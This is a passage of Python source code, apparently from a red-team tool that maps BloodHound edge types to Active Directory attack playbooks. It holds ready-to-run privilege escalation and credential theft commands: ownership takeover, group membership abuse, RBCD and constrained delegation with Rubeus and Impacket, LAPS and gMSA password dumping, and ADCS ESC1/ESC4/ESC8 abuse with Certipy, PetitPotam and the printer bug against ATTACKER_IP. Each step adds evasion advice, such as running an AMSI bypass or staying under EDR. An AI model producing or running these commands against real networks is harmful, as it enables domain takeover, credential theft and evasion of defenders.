                'title': 'Take Ownership of Target',
                'category': 'Privilege Escalation',
                'description': f'Change ownership of **{target}** to **{source}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"$targetDN = (Get-ADObject -Filter {{Name -eq '{target.split('@')[0]}'}}).DistinguishedName\n$acl = Get-Acl \"AD:$targetDN\"\n$owner = New-Object System.Security.Principal.NTAccount('{source.split('@')[0]}')\n$acl.SetOwner($owner)\nSet-Acl \"AD:$targetDN\" $acl",
                        'explanation': 'Uses native Get-Acl/Set-Acl cmdlets. **Event 5136** logged for directory service changes.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"Set-DomainObjectOwner -Identity '{target}' -OwnerIdentity '{source.split('@')[0]}'",
                        'explanation': 'PowerView is **flagged by AV/EDR**. Run AMSI bypass first.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Grant Full Control',
                'category': 'Privilege Escalation',
                'description': f'As owner, grant yourself GenericAll over **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"Add-DomainObjectAcl -TargetIdentity '{target}' -PrincipalIdentity '{source.split('@')[0]}' -Rights All",
                        'explanation': 'Grants GenericAll permission. Now you can reset passwords, add SPNs, etc.'
                    },
                ]
            },
        ],
        # =====================================================================
        # AddMember - Add yourself to a privileged group
        # =====================================================================
        'AddMember': [
            {
                'step_number': 1,
                'title': 'Add User to Privileged Group',
                'category': 'Privilege Escalation',
                'description': f'Add **{source}** (or controlled user) to **{target}** group.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Add-ADGroupMember -Identity '{target.split('@')[0]}' -Members '{source.split('@')[0]}'\n\n# Verify membership\nGet-ADGroupMember -Identity '{target.split('@')[0]}' | Select-Object Name",
                        'explanation': 'Uses built-in AD cmdlet. **Event 4728** (member added to global group) logged.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'net.exe',
                        'command': f"net group \"{target.split('@')[0]}\" {source.split('@')[0]} /add /domain",
                        'explanation': 'Uses net.exe which is commonly monitored. Prefer PowerShell for less visibility.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Leverage New Group Membership',
                'category': 'Privilege Escalation',
                'description': f'Use the new group privileges. May need to log off/on for group membership to apply.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"# Refresh Kerberos ticket to get new group membership\nklist purge\nklist get krbtgt\n\n# Or create new logon session\nrunas /netonly /user:{domain}\\{source.split('@')[0]} powershell.exe",
                        'explanation': 'Refresh Kerberos ticket or create new session to use new privileges.'
                    },
                ]
            },
        ],
        # =====================================================================
        # AllowedToAct - Resource-Based Constrained Delegation (RBCD)
        # =====================================================================
        'AllowedToAct': [
            {
                'step_number': 1,
                'title': 'Configure RBCD on Target',
                'category': 'Privilege Escalation',
                'description': f'Add controlled computer to **{target}** msDS-AllowedToActOnBehalfOfOtherIdentity.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket rbcd.py',
                        'command': f"python3 rbcd.py -delegate-from YOURCOMPUTER$ -delegate-to {target.split('@')[0]}$ -dc-ip {dc_hostname} -action write {domain}/{source.split('@')[0]}:'password'",
                        'explanation': 'Configures RBCD. Requires a computer account you control (create one or use existing).'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PowerView',
                        'command': f"$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-YOURCOMPUTER$-SID)\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\nSet-DomainObject -Identity '{target}' -Set @{{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}}",
                        'explanation': 'PowerView to set RBCD. Get computer SID first with Get-DomainComputer.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Perform S4U Attack',
                'category': 'Credential Access',
                'description': f'Use S4U2Self and S4U2Proxy to get service ticket as admin on **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket getST.py',
                        'command': f"python3 getST.py -spn cifs/{target.split('@')[0]}.{domain} -impersonate Administrator -dc-ip {dc_hostname} {domain}/YOURCOMPUTER$:'ComputerPassword'\n\nexport KRB5CCNAME=Administrator.ccache\npython3 psexec.py -k -no-pass {domain}/Administrator@{target.split('@')[0]}.{domain}",
                        'explanation': 'Gets service ticket impersonating Administrator, then uses it for access.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Rubeus',
                        'command': f"Rubeus.exe s4u /user:YOURCOMPUTER$ /rc4:COMPUTER_HASH /impersonateuser:Administrator /msdsspn:cifs/{target.split('@')[0]}.{domain} /ptt",
                        'explanation': 'Rubeus S4U attack. **Detected by EDR** - run from memory if possible.'
                    }
                ]
            },
        ],
        # =====================================================================
        # AllowedToDelegate - Constrained Delegation abuse
        # =====================================================================
        'AllowedToDelegate': [
            {
                'step_number': 1,
                'title': 'Get TGT for Delegating Account',
                'category': 'Credential Access',
                'description': f'Obtain TGT for **{source}** which has delegation rights to **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket getTGT.py',
                        'command': f"python3 getTGT.py {domain}/{source.split('@')[0]}:'password' -dc-ip {dc_hostname}",
                        'explanation': 'Gets TGT using password. Alternative: use hash with -hashes :NTHASH'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Rubeus',
                        'command': f"Rubeus.exe asktgt /user:{source.split('@')[0]} /password:password /domain:{domain} /dc:{dc_hostname}",
                        'explanation': 'Rubeus TGT request. Known offensive tool - may trigger alerts.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Perform S4U2Proxy Attack',
                'category': 'Privilege Escalation',
                'description': f'Use constrained delegation to impersonate admin on **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket getST.py',
                        'command': f"export KRB5CCNAME={source.split('@')[0]}.ccache\npython3 getST.py -spn cifs/{target.split('@')[0]} -impersonate Administrator -dc-ip {dc_hostname} {domain}/{source.split('@')[0]} -k -no-pass\n\nexport KRB5CCNAME=Administrator.ccache\npython3 psexec.py -k -no-pass Administrator@{target.split('@')[0]}.{domain}",
                        'explanation': 'S4U2Proxy to impersonate Administrator on allowed target service.'
                    },
                ]
            },
        ],
        # =====================================================================
        # ReadLAPSPassword - Read local admin passwords
        # =====================================================================
        'ReadLAPSPassword': [
            {
                'step_number': 1,
                'title': 'Read LAPS Password',
                'category': 'Credential Access',
                'description': f'Read the LAPS-managed local administrator password for **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"Get-ADComputer -Identity '{target.split('@')[0]}' -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime | Select-Object Name, 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime'",
                        'explanation': 'Uses built-in AD cmdlet to query LAPS attribute. No special tools needed.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'NetExec',
                        'command': f"nxc ldap {dc_hostname} -u {source.split('@')[0]} -p 'password' -d {domain} --module laps",
                        'explanation': 'NetExec LAPS module queries all readable LAPS passwords.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Authenticate with LAPS Password',
                'category': 'Lateral Movement',
                'description': f'Use the retrieved password to authenticate as local admin on **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell',
                        'command': f"$cred = New-Object System.Management.Automation.PSCredential('{target.split('@')[0]}\\Administrator', (ConvertTo-SecureString 'LAPS_PASSWORD_HERE' -AsPlainText -Force))\nEnter-PSSession -ComputerName {target.split('@')[0]} -Credential $cred",
                        'explanation': 'WinRM/PSRemoting as local admin. Blends with normal admin activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket',
                        'command': f"python3 psexec.py {target.split('@')[0]}/Administrator:'LAPS_PASSWORD_HERE'@{target.split('@')[0]}",
                        'explanation': 'PsExec creates service on target. Event 7045 logged.'
                    }
                ]
            },
        ],
        # =====================================================================
        # ReadGMSAPassword - Read Group Managed Service Account password
        # =====================================================================
        'ReadGMSAPassword': [
            {
                'step_number': 1,
                'title': 'Read gMSA Password',
                'category': 'Credential Access',
                'description': f'Read the Group Managed Service Account password for **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native PowerShell (DSInternals)',
                        'command': f"# Requires DSInternals module\nInstall-Module DSInternals -Force\n$gmsa = Get-ADServiceAccount -Identity '{target.split('@')[0]}' -Properties 'msDS-ManagedPassword'\n$blob = $gmsa.'msDS-ManagedPassword'\n$mp = ConvertFrom-ADManagedPasswordBlob $blob\n$mp.CurrentPassword | ConvertTo-NTHash",
                        'explanation': 'DSInternals module decodes the gMSA password blob into NT hash.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'gMSADumper',
                        'command': f"python3 gMSADumper.py -u {source.split('@')[0]} -p 'password' -d {domain}",
                        'explanation': 'Dumps all gMSA passwords you have read access to.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Use gMSA Credentials',
                'category': 'Lateral Movement',
                'description': f'Authenticate as the gMSA using the extracted NT hash.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket',
                        'command': f"python3 psexec.py -hashes :NTHASH {domain}/{target.split('@')[0]}$@{dc_hostname}",
                        'explanation': 'Pass-the-hash with gMSA NT hash. Note the $ suffix for service accounts.'
                    },
                ]
            },
        ],
        # =====================================================================
        # ADCS ESC1 - Misconfigured Certificate Template Abuse
        # =====================================================================
        'ADCSESC1': [
            {
                'step_number': 1,
                'title': 'Enumerate Vulnerable Certificate Templates',
                'category': 'Discovery',
                'description': f'Identify certificate templates that allow enrollment with SAN (Subject Alternative Name) override.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native Windows',
                        'command': f"certutil -catemplates -v | Select-String -Pattern 'msPKI-Certificate-Name-Flag|CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT'",
                        'explanation': 'Uses built-in **certutil** to enumerate certificate templates. Normal administrative activity that won\'t trigger alerts.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"certipy find -u {source}@{domain} -p 'password' -dc-ip {dc_hostname} -stdout -vulnerable",
                        'explanation': 'Certipy is a Python tool that runs from Linux. **Network-based LDAP enumeration** may be logged.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Request Certificate with Admin SAN',
                'category': 'Privilege Escalation',
                'description': f'Request a certificate for the vulnerable template **{target}** with Administrator as the Subject Alternative Name.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native Windows certreq',
                        'command': f"# Create request.inf:\n[NewRequest]\nSubject = \"CN={source}\"\nKeyLength = 2048\nExportable = TRUE\n[RequestAttributes]\nSAN = \"upn=administrator@{domain}\"\nCertificateTemplate = {target}\n\n# Submit request:\ncertreq -new request.inf request.req\ncertreq -submit -config \"CA.{domain}\\CA\" request.req cert.cer",
                        'explanation': 'Uses built-in **certreq** utility. Creates legitimate certificate request - standard PKI operation.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"certipy req -u {source}@{domain} -p 'password' -target CA.{domain} -template '{target}' -upn administrator@{domain} -ca CA_NAME -dc-ip {dc_hostname}",
                        'explanation': 'Certipy certificate request from Linux. **Generates Event 4886/4887** for certificate enrollment.'
                    }
                ]
            },
            {
                'step_number': 3,
                'title': 'Authenticate with Certificate',
                'category': 'Credential Access',
                'description': 'Use the issued certificate to authenticate as Administrator via PKINIT.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native Windows',
                        'command': f"# Import certificate:\ncertutil -user -importpfx admin.pfx\n\n# Request TGT with certificate:\nRubeusGUI.exe /ticket:certificate",
                        'explanation': 'Uses native Windows certificate import. Certificate-based authentication is normal PKI activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"certipy auth -pfx admin.pfx -dc-ip {dc_hostname}",
                        'explanation': 'PKINIT authentication from Linux. **Event 4768 with pre-auth type 16** will be logged.'
                    }
                ]
            },
        ],
        # =====================================================================
        # ADCS ESC4 - Certificate Template ACL Abuse
        # =====================================================================
        'ADCSESC4': [
            {
                'step_number': 1,
                'title': 'Modify Vulnerable Certificate Template',
                'category': 'Privilege Escalation',
                'description': f'Modify the certificate template **{target}** to enable ESC1-style exploitation.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"# Save original template config:\ncertipy template -u {source}@{domain} -p 'password' -template '{target}' -dc-ip {dc_hostname} -save-old\n\n# Modify template to enable SAN:\ncertipy template -u {source}@{domain} -p 'password' -template '{target}' -dc-ip {dc_hostname} -configuration ESC1",
                        'explanation': 'Modifies certificate template ACLs. **Event 5136** logged for directory object modification.'
                    },
                ]
            },
            {
                'step_number': 2,
                'title': 'Request Certificate (Now ESC1 Vulnerable)',
                'category': 'Privilege Escalation',
                'description': 'Request certificate with admin SAN now that template is modified.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native Windows certreq',
                        'command': f"certreq -new -q request.inf request.req\ncertreq -submit -config \"CA.{domain}\\CA\" request.req cert.cer",
                        'explanation': 'Uses built-in certreq. Standard certificate enrollment activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"certipy req -u {source}@{domain} -p 'password' -target CA.{domain} -template '{target}' -upn administrator@{domain} -ca CA_NAME -dc-ip {dc_hostname}",
                        'explanation': 'Request certificate from Linux attack machine.'
                    }
                ]
            },
            {
                'step_number': 3,
                'title': 'Authenticate and Cleanup',
                'category': 'Credential Access',
                'description': 'Authenticate with certificate, then restore original template configuration.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"# Authenticate:\ncertipy auth -pfx admin.pfx -dc-ip {dc_hostname}\n\n# Restore original template:\ncertipy template -u {source}@{domain} -p 'password' -template '{target}' -dc-ip {dc_hostname} -configuration original.json",
                        'explanation': 'PKINIT auth then restore template. Always cleanup after exploitation.'
                    },
                ]
            },
        ],
        # =====================================================================
        # ADCS ESC8 - NTLM Relay to AD CS HTTP Endpoint
        # =====================================================================
        'ADCSESC8': [
            {
                'step_number': 1,
                'title': 'Setup NTLM Relay to AD CS',
                'category': 'Credential Access',
                'description': 'Configure ntlmrelayx to relay captured authentication to the AD CS web enrollment endpoint.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Impacket ntlmrelayx',
                        'command': f"ntlmrelayx.py -t http://CA.{domain}/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
                        'explanation': 'Sets up relay to AD CS. Requires coercion attack to trigger machine authentication.'
                    },
                ]
            },
            {
                'step_number': 2,
                'title': 'Coerce Machine Authentication',
                'category': 'Initial Access',
                'description': f'Force **{target}** to authenticate to our relay listener.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PetitPotam',
                        'command': f"python3 PetitPotam.py ATTACKER_IP {dc_hostname}",
                        'explanation': 'Triggers EfsRpcOpenFileRaw to coerce DC authentication. **May trigger EDR alerts**.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'PrinterBug',
                        'command': f"python3 printerbug.py {domain}/{source}:'password'@{dc_hostname} ATTACKER_IP",
                        'explanation': 'Print Spooler coercion. Requires spooler service running on target.'
                    }
                ]
            },
            {
                'step_number': 3,
                'title': 'Authenticate with Relayed Certificate',
                'category': 'Credential Access',
                'description': 'Use the certificate obtained via relay to authenticate as the machine account.',
                'opsec_options': [
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"certipy auth -pfx dc.pfx -dc-ip {dc_hostname}",
                        'explanation': 'PKINIT authentication with DC machine certificate. Enables DCSync.'
                    },
                ]
            },
        ],
        # =====================================================================
        # Enroll - Generic certificate enrollment rights
        # =====================================================================
        'Enroll': [
            {
                'step_number': 1,
                'title': 'Enumerate Enrollable Templates',
                'category': 'Discovery',
                'description': f'Find templates where **{source}** has enrollment rights.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native Windows',
                        'command': 'certutil -catemplates',
                        'explanation': 'Uses built-in certutil. Normal certificate administration activity.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"certipy find -u {source}@{domain} -p 'password' -dc-ip {dc_hostname} -stdout",
                        'explanation': 'Full ADCS enumeration from Linux. More comprehensive but network-based.'
                    }
                ]
            },
            {
                'step_number': 2,
                'title': 'Request Certificate',
                'category': 'Credential Access',
                'description': f'Request certificate for template **{target}**.',
                'opsec_options': [
                    {
                        'opsec_level': 'safe',
                        'tool_name': 'Native Windows certreq',
                        'command': f"certreq -new request.inf request.req\ncertreq -submit request.req",
                        'explanation': 'Standard certificate request using built-in Windows tools.'
                    },
                    {
                        'opsec_level': 'risky',
                        'tool_name': 'Certipy',
                        'command': f"certipy req -u {source}@{domain} -p 'password' -template '{target}' -ca CA_NAME -dc-ip {dc_hostname}",
                        'explanation': 'Request certificate from Linux. Network-based certificate enrollment.'
                    }
                ]
            },
        ],
    }


def _get_default_template(edge_type: str) -> List[Dict]:
    """
    Get default template for unknown edge types.
    This is a last-resort fallback - should rarely be used since most edges have specific templates.
    """
    return [
        {
            'step_number': 1,
            'title': f'Exploit {edge_type} Relationship',
            'category': 'Privilege Escalation',
            'description': f'Leverage the **{edge_type}** relationship identified in the BloodHound data.',
            'opsec_options': [
                {
                    'opsec_level': 'safe',
                    'tool_name': 'Native PowerShell',
                    'command': f"# The specific exploitation command depends on the {edge_type} context\n# Check the step description for guidance on this relationship type",
                    'explanation': f'The {edge_type} relationship can be exploited using various techniques. Use native AD cmdlets when possible.'
                },
            ]
        },
    ]
